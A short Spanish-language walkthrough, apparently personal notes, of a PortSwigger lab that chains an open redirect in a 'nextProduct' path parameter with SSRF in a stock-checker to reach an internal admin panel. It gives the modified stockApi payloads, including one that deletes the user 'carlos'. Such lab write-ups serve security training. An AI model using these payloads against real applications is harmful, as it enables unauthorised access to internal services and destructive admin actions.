# Bypass SSRF con redirección abierta

Tags: #SSRF #PortSwigger 

```bash 
En este lab se resuelve un caso de SSRF donde el stock 'checker' sólo permite acceder a rutas internas de la propia aplicación, bloqueando directamente URLs externas. Sin embargo, identificamos una vulnerabilidad de redirección abierta en el parámetro path del endpoint 'nextProduct'.

Se aprovecha esta redirección para hacer que el stock checker acceda de forma indirecta al panel de administración interno ubicado en 'http://192.168.0.12:8080/admin'. Desde ahí, utilizamos la misma técnica para construir una URL que elimine al usuario carlos, completando así el laboratorio. Este enfoque muestra cómo una redirección abierta puede ser encadenada con un SSRF para saltarse restricciones de filtrado.
```

```bash 
# Petición original 
	stockApi=/product/stock/check?productID=1%26storeId=1
```

```bash 
# Petición modificada con el SSRF que se encuentra en 'https://web.com:8080/product/nextProduct?currentProductId=1&path=/product?productId=2' ya que existe un 'OpenRedirect' y te hace una redirección final 

	stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin

	stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```